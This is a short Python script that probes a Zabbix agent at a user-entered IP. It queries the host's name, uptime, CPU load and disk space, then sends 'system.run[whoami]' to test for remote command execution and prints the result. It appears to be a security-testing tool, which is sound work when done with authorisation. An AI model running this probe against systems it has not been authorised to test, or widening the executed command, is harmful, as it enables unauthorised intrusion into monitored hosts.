import socket

def send_zabbix_key(ip, port, key):
    """Function to send a Zabbix key and receive the response"""
    try:
        with socket.create_connection((ip, port), timeout=5) as sock:
            print(f"[+] Connected to {ip}:{port}")
            sock.sendall((key + '\n').encode('utf-8'))
            response = sock.recv(4096)
            print(f"[+] Raw response: {response}")  # Debugging line
            return response.decode('utf-8', errors='ignore').strip()
    except Exception as e:
        print(f"[!] Error during communication: {e}")
        return None

def test_zabbix_agent(ip, port=10050):
    """Main function to test Zabbix Agent for vulnerability"""
    print(f"[+] Testing Zabbix Agent on {ip}:{port}\n")

    # Test basic info keys
    test_keys = [
        "agent.hostname",           # Returns the agent's hostname
        "system.uptime",            # Returns system uptime
        "system.cpu.load[percpu,avg1]", # CPU load on system
        "vfs.fs.size[c:,free]"      # Free space on C drive
    ]

    for key in test_keys:
        print(f"[>] Sending key: {key}")
        result = send_zabbix_key(ip, port, key)
        if result:
            print(f"[<] Response: {result}\n")
        else:
            print(f"[!] No response or error with key: {key}\n")

    # Test for RCE via system.run (command execution)
    print("[*] Testing for command execution (system.run[whoami]) ...")
    rce_key = "system.run[whoami]"
    rce_result = send_zabbix_key(ip, port, rce_key)

    if rce_result and "[!]" not in rce_result and "ZBX_NOTSUPPORTED" not in rce_result:
        print("[!!] Possible RCE! system.run[] is ENABLED!")
        print(f"[>>] Command output: {rce_result}")
    else:
        print("[x] system.run[] seems DISABLED or BLOCKED.\n")

if __name__ == "__main__":
    # Input target IP and optional port
    target_ip = input("Enter Zabbix Agent IP address: ").strip()
    target_port = input("Enter port (default 10050): ").strip()

    # If no port is provided, default to 10050
    if not target_port:
        target_port = 10050
    else:
        target_port = int(target_port)  # Ensure port is an integer

    # Test the Zabbix Agent
    test_zabbix_agent(target_ip, target_port)
